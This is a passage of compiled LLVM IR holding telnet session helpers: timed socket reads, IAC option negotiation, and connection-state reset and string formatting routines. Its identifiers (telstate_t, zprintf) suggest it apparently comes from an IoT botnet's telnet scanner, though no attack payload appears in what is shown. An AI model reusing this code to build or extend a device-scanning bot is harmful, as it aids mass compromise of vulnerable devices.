  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #5, !srcloc !1
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  br label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %27
  store i32 0, i32* %5, align 4
  br label %51

; <label>:44:                                     ; preds = %27
  %45 = load i32, i32* %6, align 4
  %46 = load i8*, i8** %8, align 8
  %47 = load i32, i32* %9, align 4
  %48 = sext i32 %47 to i64
  %49 = call i64 @recv(i32 %45, i8* %46, i64 %48, i32 0)
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %5, align 4
  br label %51

; <label>:51:                                     ; preds = %44, %43
  %52 = load i32, i32* %5, align 4
  ret i32 %52
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #1

declare i64 @recv(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

; <label>:37:                                     ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

; <label>:38:                                     ; preds = %37, %36
  %39 = load i32, i32* %6, align 4
  ret i32 %39
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

declare i32 @close(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_telstate(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #9
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  br label %23

; <label>:23:                                     ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #9
  %35 = icmp ne i32 %34, 0
  br label %36

; <label>:36:                                     ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

; <label>:38:                                     ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23

; <label>:41:                                     ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

; <label>:47:                                     ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

; <label>:59:                                     ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43

; <label>:62:                                     ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %283, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %286

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %274

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %286

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %275

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45

; <label>:55:                                     ; preds = %45
  br label %56

; <label>:56:                                     ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

; <label>:61:                                     ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

; <label>:66:                                     ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

; <label>:68:                                     ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

; <label>:77:                                     ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56

; <label>:80:                                     ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %119

; <label>:85:                                     ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

; <label>:90:                                     ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i32*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

; <label>:96:                                     ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i32*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

; <label>:101:                                    ; preds = %96, %90
  %102 = phi i32* [ %94, %90 ], [ %99, %96 ]
  %103 = load i32, i32* %102, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %11, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %11, align 8
  br label %112

; <label>:111:                                    ; preds = %101
  br label %112

; <label>:112:                                    ; preds = %111, %109
  %113 = phi i8* [ %110, %109 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.575, i32 0, i32 0), %111 ]
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @prints(i8** %106, i8* %113, i32 %114, i32 %115)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %9, align 4
  br label %283

; <label>:119:                                    ; preds = %80
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 100
  br i1 %123, label %124, label %149

; <label>:124:                                    ; preds = %119
  %125 = load i8**, i8*** %4, align 8
  %126 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %127 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 0
  %128 = load i32, i32* %127, align 8
  %129 = icmp ule i32 %128, 40
  br i1 %129, label %130, label %136

; <label>:130:                                    ; preds = %124
  %131 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 3
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr i8, i8* %132, i32 %128
  %134 = bitcast i8* %133 to i32*
  %135 = add i32 %128, 8
  store i32 %135, i32* %127, align 8
  br label %141

; <label>:136:                                    ; preds = %124
  %137 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 2
  %138 = load i8*, i8** %137, align 8
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr i8, i8* %138, i32 8
  store i8* %140, i8** %137, align 8
  br label %141

; <label>:141:                                    ; preds = %136, %130
  %142 = phi i32* [ %134, %130 ], [ %139, %136 ]
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @printi(i8** %125, i32 %143, i32 10, i32 1, i32 %144, i32 %145, i32 97)
  %147 = load i32, i32* %9, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %9, align 4
  br label %283

; <label>:149:                                    ; preds = %119
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 120
  br i1 %153, label %154, label %179

; <label>:154:                                    ; preds = %149
  %155 = load i8**, i8*** %4, align 8
  %156 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = icmp ule i32 %158, 40
  br i1 %159, label %160, label %166

; <label>:160:                                    ; preds = %154
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 3
  %162 = load i8*, i8** %161, align 8
  %163 = getelementptr i8, i8* %162, i32 %158
  %164 = bitcast i8* %163 to i32*
  %165 = add i32 %158, 8
  store i32 %165, i32* %157, align 8
  br label %171

; <label>:166:                                    ; preds = %154
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

; <label>:171:                                    ; preds = %166, %160
  %172 = phi i32* [ %164, %160 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** %155, i32 %173, i32 16, i32 0, i32 %174, i32 %175, i32 97)
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, %176
  store i32 %178, i32* %9, align 4
  br label %283

; <label>:179:                                    ; preds = %149
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 88
  br i1 %183, label %184, label %209

; <label>:184:                                    ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %196

; <label>:190:                                    ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = add i32 %188, 8
  store i32 %195, i32* %187, align 8
  br label %201

; <label>:196:                                    ; preds = %184
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %198 = load i8*, i8** %197, align 8
  %199 = bitcast i8* %198 to i32*
  %200 = getelementptr i8, i8* %198, i32 8
  store i8* %200, i8** %197, align 8
  br label %201

; <label>:201:                                    ; preds = %196, %190
  %202 = phi i32* [ %194, %190 ], [ %199, %196 ]
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* %7, align 4
  %205 = load i32, i32* %8, align 4
  %206 = call i32 @printi(i8** %185, i32 %203, i32 16, i32 0, i32 %204, i32 %205, i32 65)
  %207 = load i32, i32* %9, align 4
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %9, align 4
  br label %283

; <label>:209:                                    ; preds = %179
  %210 = load i8*, i8** %5, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 117
  br i1 %213, label %214, label %239

; <label>:214:                                    ; preds = %209
  %215 = load i8**, i8*** %4, align 8
  %216 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp ule i32 %218, 40
  br i1 %219, label %220, label %226

; <label>:220:                                    ; preds = %214
  %221 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 3
  %222 = load i8*, i8** %221, align 8
  %223 = getelementptr i8, i8* %222, i32 %218
  %224 = bitcast i8* %223 to i32*
  %225 = add i32 %218, 8
  store i32 %225, i32* %217, align 8
  br label %231

; <label>:226:                                    ; preds = %214
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

; <label>:231:                                    ; preds = %226, %220
  %232 = phi i32* [ %224, %220 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** %215, i32 %233, i32 10, i32 0, i32 %234, i32 %235, i32 97)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, %236
  store i32 %238, i32* %9, align 4
  br label %283

; <label>:239:                                    ; preds = %209
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 99
  br i1 %243, label %244, label %273

; <label>:244:                                    ; preds = %239
  %245 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %246 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp ule i32 %247, 40
  br i1 %248, label %249, label %255

; <label>:249:                                    ; preds = %244
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 3
  %251 = load i8*, i8** %250, align 8
  %252 = getelementptr i8, i8* %251, i32 %247
  %253 = bitcast i8* %252 to i32*
  %254 = add i32 %247, 8
  store i32 %254, i32* %246, align 8
  br label %260

; <label>:255:                                    ; preds = %244
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 2
  %257 = load i8*, i8** %256, align 8
  %258 = bitcast i8* %257 to i32*
  %259 = getelementptr i8, i8* %257, i32 8
  store i8* %259, i8** %256, align 8
  br label %260

; <label>:260:                                    ; preds = %255, %249
  %261 = phi i32* [ %253, %249 ], [ %258, %255 ]
  %262 = load i32, i32* %261, align 4
  %263 = trunc i32 %262 to i8
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %263, i8* %264, align 1
  %265 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %265, align 1
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @prints(i8** %266, i8* %267, i32 %268, i32 %269)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %283

; <label>:273:                                    ; preds = %239
  br label %282

; <label>:274:                                    ; preds = %17
  br label %275

; <label>:275:                                    ; preds = %274, %35
  %276 = load i8**, i8*** %4, align 8
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  call void @printchar(i8** %276, i32 %279)
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %9, align 4
  br label %282

; <label>:282:                                    ; preds = %275, %273
  br label %283

